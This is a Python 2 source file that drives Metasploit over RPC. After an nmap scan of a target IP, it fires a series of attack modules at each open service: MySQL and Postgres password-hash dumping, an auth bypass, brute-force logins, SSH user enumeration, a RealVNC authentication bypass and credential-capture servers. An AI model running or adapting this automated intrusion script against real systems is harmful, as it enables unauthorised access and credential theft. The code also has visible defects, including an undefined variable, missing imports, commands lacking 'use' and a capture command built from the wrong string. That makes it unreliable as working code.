# -*- encoding: utf-8 -*-
#class for connecting with MetaSploit and launch console commands

#metaexploit framwework
import msfrpc

class MetaSploitFrameWork:
    
    def __init__(self, port, host, ip, user, password):
        self.client = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':port, 'host':host, 'ssl': True})
        self.auth = self.client.login(user,password)
        #Escaneo sincrono
        self.nm = nmap.PortScanner()
        if self.auth:
            self.console = self.client.call('console.create')
        self.ip = ip
    
    def scanMetaSploitFrameWork(self):
    
        print 'Scannning Port MetaExploitFrameWork....................'
    
        # Check what time the scan started
        t1 = datetime.now()
        
        #scan port FTP,SSH,HTTP,SSL,MYSQL,VNC,POSTGRES,MONGODB
        self.nm.scan(ip, arguments="-A -sV -p21,22,80,8080,443,5432,3306,27017,1241,9160,5900")

        host = self.nm.all_hosts()[0]
        print 'Host: ' + host

        for port in self.nm[host]['tcp']:
            print 'Port {0} --> {1}'.format(port,self.nm[host]['tcp'][port]['state'])
            
            #mysql
            if (port==3306) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MYSQL scripts......'
                self.metaSploitMYSQL()
            
            #FTP
            if (port==21) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking FTP scripts......'
                self.metaSploitFTP()
            
            #vnc
            if (port==5900) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking VNC scripts......'
                self.metaSploitVNC()
                
            #postgres
            if (port==5432) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking POSTGRES scripts......'
                self.metaSploitPostGres()
                
            #mongodb
            if (port==27017) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MONGODB scripts......'
                self.metaSploitMongoDB()
                
            
            #ssl
            if (port==443) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSL scripts......'
                self.metaSploitSSL()
                
            #ssh
            if (port==22) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSH scripts......'
                self.metaSploitSSH()
                
            #http
            if (port==80 or port==8080) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking HTTP scripts......'
        
        
        # Checking the time again
        t2 = datetime.now()

        # Calculates the difference of time, to see how long it took to run the script
        total =  t2 - t1

        # Printing the information to screen
        print 'Scanning Completed in: ', total
        
    def processData(self, consoleId):
        while True:
            readedData = self.client.call('console.read',[consoleId])
            print readedData['data']
            if len(readedData['data']) > 1:
                print readedData['data']
            if readedData['busy'] == True:
                time.sleep(1)
                continue
            break
        
    

            
    #METASPLOIT SSL
    def metaSploitSSL(self):
        
        #auxiliary/gather/impersonate_ssl
        cmdSSLimpersonate = """auxiliary/gather/impersonate_ssl
        set RHOSTS """+ip
    
        cmdSSLimpersonate = cmdSSLimpersonate +"""\nrun 
        """
        print cmdSSLimpersonate
    
        print self.client.call('console.write',[self.console['id'],cmdSSLimpersonate])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/http/ssl
        cmdSSLhttp = """auxiliary/scanner/http/ssl
        set RHOSTS """ + self.ip
    
        cmdSSLhttp = cmdSSLhttp +"""\nrun 
        """
        print cmdSSLhttp
    
        print self.client.call('console.write',[self.console['id'],cmdSSLhttp])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/http/ssl_version
        cmdSSLversion = """auxiliary/scanner/http/ssl_version
        set RHOSTS """ + self.ip
    
        cmdSSLversion = cmdSSLversion +"""\nrun 
        """
        print cmdSSLversion
    
        print self.client.call('console.write',[self.console['id'],cmdSSLversion])
        self.processData(self.console['id'])
        
    #METASPLOIT SSH
    def metaSploitSSH(self):
        
        #auxiliary/scanner/ssh/cerberus_sftp_enumusers
        cmdSSHenumUsers = """auxiliary/scanner/ssh/cerberus_sftp_enumusers
        set RHOSTS """ + self.ip
    
        cmdSSHenumUsers = cmdSSHenumUsers +"""\nrun 
        """
        print cmdSSHenumUsers
    
        print self.client.call('console.write',[self.console['id'],cmdSSHenumUsers])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/detect_kippo
        cmdSSHkippo = """auxiliary/scanner/ssh/detect_kippo
        set RHOSTS """ + self.ip
    
        cmdSSHkippo = cmdSSHkippo +"""\nrun 
        """
        print cmdSSHkippo
    
        print self.client.call('console.write',[self.console['id'],cmdSSHkippo])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_enumusers
        cmdSSHenumUsers = """auxiliary/scanner/ssh/ssh_enumusers
        set RHOSTS """ + self.ip
    
        cmdSSHenumUsers = cmdSSHenumUsers +"""\nrun 
        """
        print cmdSSHenumUsers
    
        print self.client.call('console.write',[self.console['id'],cmdSSHenumUsers])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_identify_pubkeys
        cmdSShpubkeys = """auxiliary/scanner/ssh/ssh_identify_pubkeys
        set RHOSTS """ + self.ip
    
        cmdSShpubkeys = cmdSShpubkeys +"""\nrun 
        """
        print cmdSShpubkeys
    
        print self.client.call('console.write',[self.console['id'],cmdSShpubkeys])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_login
        cmdSShLogin = """auxiliary/scanner/ssh/ssh_login
        set RHOSTS """ + self.ip
    
        cmdSShLogin = cmdSShLogin +"""\nrun 
        """
        print cmdSShLogin
    
        print self.client.call('console.write',[self.console['id'],cmdSShLogin])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_login_pubkey
        cmdSShLoginPubKey = """auxiliary/scanner/ssh/ssh_login_pubkey
        set RHOSTS """ + self.ip
    
        cmdSShLoginPubKey = cmdSShLoginPubKey +"""\nrun 
        """
        print cmdSShLoginPubKey
    
        print self.client.call('console.write',[self.console['id'],cmdSShLoginPubKey])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_version
        cmdSShVersion = """auxiliary/scanner/ssh/ssh_version
        set RHOSTS """ + self.ip
    
        cmdSShVersion = cmdSShVersion +"""\nrun 
        """
        print cmdSShVersion
    
        print self.client.call('console.write',[self.console['id'],cmdSShVersion])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_version
        cmdSShVersion = """auxiliary/scanner/ssh/ssh_version
        set RHOSTS """ + self.ip
    
        cmdSShVersion = cmdSShVersion +"""\nrun 
        """
        print cmdSShVersion
    
        print self.client.call('console.write',[self.console['id'],cmdSShVersion])
        self.processData(self.console['id'])
        
    #METASPLOIT mongodb
    def metaSploitMongoDB(self):
        
        #auxiliary/gather/mongodb_js_inject_collection_enum
        cmdMongoDBEnum = """auxiliary/gather/mongodb_js_inject_collection_enum
        set RHOSTS """ + self.ip
    
        cmdMongoDBEnum = cmdMongoDBEnum +"""\nrun 
        """
        print cmdMongoDBEnum
    
        print self.client.call('console.write',[self.console['id'],cmdMongoDBEnum])
        self.processData(self.console['id'])
    
        #auxiliary/gather/mongodb_js_inject_collection_enum
        cmdMongoDBEnum = """auxiliary/gather/mongodb_js_inject_collection_enum
        set RHOSTS """ + self.ip
    
        cmdMongoDBEnum = cmdMongoDBEnum +"""\nrun 
        """
        print cmdMongoDBEnum
    
        print self.client.call('console.write',[self.console['id'],cmdMongoDBEnum])
        self.processData(self.console['id'])
        
        #METASPLOIT FTP
    def metaSploitFTP(self):
        
        #auxiliary/scanner/ftp/anonymous
        cmdFtpAnonymous="""use auxiliary/scanner/ftp/anonymous
        set RHOSTS """ + self.ip

        cmdFtpAnonymous = cmdFtpAnonymous +"""\nrun 
        """
        print cmdFtpAnonymous
    
        print self.client.call('console.write',[self.console['id'],cmdFtpAnonymous])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/ftp/ftp_login
        cmdFtpLogin="""use auxiliary/scanner/ftp/ftp_login
        set RHOSTS """ + self.ip

        cmdFtpLogin = cmdFtpLogin +"""\nrun 
        """
        print cmdFtpLogin
    
        print self.client.call('console.write',[self.console['id'],cmdFtpLogin])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/ftp/ftp_version
        cmdFtpVersion="""use auxiliary/scanner/ftp/ftp_version
        set RHOSTS """+ self.ip

        cmdFtpVersion = cmdFtpVersion +"""\nrun 
        """
        print cmdFtpVersion
    
        print self.client.call('console.write',[self.console['id'],cmdFtpVersion])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/portscan/ftpbounce
        cmdFtpScanner="""use auxiliary/scanner/portscan/ftpbounce
        set RHOSTS """+ self.ip + """
        set BOUNCEHOST """ + self.ip
        cmdFtpScanner = cmdFtpScanner +"""\nrun 
        """
        print cmdFtpScanner
    
        print self.client.call('console.write',[self.console['id'],cmdFtpScanner])
        self.processData(self.console['id'])
        
    #METASPLOIT MYSQL
    def metaSploitMYSQL(self):
        
        #use auxiliary/scanner/mysql/mysql_authbypass_hashdump
        cmdMysqlAuth="""use auxiliary/scanner/mysql/mysql_authbypass_hashdump
        set RHOSTS """+ self.ip
    
        cmdMysqlAuth = cmdMysqlAuth +"""\nrun 
        """
        print cmdMysqlAuth
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlAuth])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_file_enum
        cmdMysqlEnum="""auxiliary/scanner/mysql/mysql_file_enum
        set RHOSTS """+ self.ip
    
        cmdMysqlEnum = cmdMysqlEnum +"""\nrun 
        """
        print cmdMysqlEnum
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlEnum])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_login
        cmdMysqlLogin="""auxiliary/scanner/mysql/mysql_login
        set RHOSTS """ + self.ip
    
        cmdMysqlLogin = cmdMysqlLogin +"""\nrun 
        """
        print cmdMysqlLogin
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlLogin])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_schemadump
        cmdMysqlSchema="""auxiliary/scanner/mysql/mysql_schemadump
        set RHOSTS """ + self.ip
    
        cmdMysqlSchema = cmdMysqlSchema +"""\nrun 
        """
        print cmdMysqlSchema
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlSchema])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_version
        cmdMysqlVersion="""auxiliary/scanner/mysql/mysql_version
        set RHOSTS """ + self.ip
    
        cmdMysqlVersion = cmdMysqlVersion +"""\nrun 
        """
        print cmdMysqlVersion
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlVersion])
        self.processData(self.console['id'])
    
        #use auxiliary/server/capture/mysql
        cmdMysqlServerCapture="""auxiliary/server/capture/mysql
        set RHOSTS """ + self.ip
    
        cmdMysqlServerCapture = cmdMysqlServerCapture +"""\nrun 
        """
        print cmdMysqlServerCapture
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlServerCapture])
        self.processData(self.console['id'])
        
    #METASPLOIT POSTGRES
    def metaSploitPostGres(self):
  
        #use auxiliary/scanner/postgres/postgres_dbname_flag_injection
        cmdPostgresDBName="""auxiliary/scanner/postgres/postgres_dbname_flag_injection
        set RHOSTS """ + self.ip
    
        cmdPostgresDBName = cmdPostgresDBName +"""\nrun 
        """
        print cmdPostgresDBName
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresDBName])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_hashdump
        cmdPostgresHashDump="""auxiliary/scanner/postgres/postgres_hashdump
        set RHOSTS """ + self.ip
    
        cmdPostgresHashDump = cmdPostgresHashDump +"""\nrun 
        """
        print cmdPostgresHashDump
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresHashDump])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_login
        cmdPostgresLogin="""auxiliary/scanner/postgres/postgres_login
        set RHOSTS """ + self.ip
    
        cmdPostgresLogin = cmdPostgresLogin +"""\nrun 
        """
        print cmdPostgresLogin
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresLogin])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_version
        cmdPostgresVersion="""auxiliary/scanner/postgres/postgres_version
        set RHOSTS """ + self.ip
    
        cmdPostgresVersion = cmdPostgresVersion +"""\nrun 
        """
        print cmdPostgresVersion
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresVersion])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_schemadump
        cmdPostgresSchema = """auxiliary/scanner/postgres/postgres_schemadump
        set RHOSTS """ + self.ip
    
        cmdPostgresSchema = cmdPostgresSchema +"""\nrun 
        """
        print cmdPostgresSchema
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresSchema])
        self.processData(self.console['id'])
    
        #use auxiliary/server/capture/postgresql
        cmdPostgresServer = """auxiliary/server/capture/postgresql
        set RHOSTS """ + self.ip
    
        cmdPostgresServer = cmdPostgresSchema +"""\nrun 
        """
        print cmdPostgresServer
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresServer])
        self.processData(self.console['id'])
        
    #METASPLOIT VNC
    def metaSploitVNC(self):

        #auxiliary/scanner/vnc/vnc_login
        cmdVNCLgoin = """auxiliary/scanner/vnc/vnc_login
        set RHOSTS """ + self.ip
    
        cmdVNCLgoin = cmdVNCLgoin +"""\nrun 
        """
        print cmdVNCLgoin
    
        print self.client.call('console.write',[self.console['id'],cmdVNCLgoin])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/vnc/vnc_none_auth
        cmdVNCAuth = """auxiliary/scanner/vnc/vnc_none_auth
        set RHOSTS """ + self.ip
    
        cmdVNCAuth = cmdVNCAuth +"""\nrun 
        """
        print cmdVNCAuth
    
        print self.client.call('console.write',[self.console['id'],cmdVNCAuth])
        self.processData(self.console['id'])
    
        #auxiliary/server/capture/vnc
        cmdVNCServer = """auxiliary/server/capture/vnc
        set RHOSTS """ + self.ip
    
        cmdVNCServer = cmdVNCServer +"""\nrun 
        """
        print cmdVNCServer
    
        print self.client.call('console.write',[self.console['id'],cmdVNCServer])
        self.processData(self.console['id'])
    
        #auxiliary/admin/vnc/realvnc_41_bypass
        cmdVNCByPass = """auxiliary/admin/vnc/realvnc_41_bypass
        set RHOSTS """+ self.ip
    
        cmdVNCByPass = cmdVNCByPass +"""\nrun 
        """
        print cmdVNCByPass
    
        print self.client.call('console.write',[self.console['id'],cmdVNCByPass])
        self.processData(self.console['id'])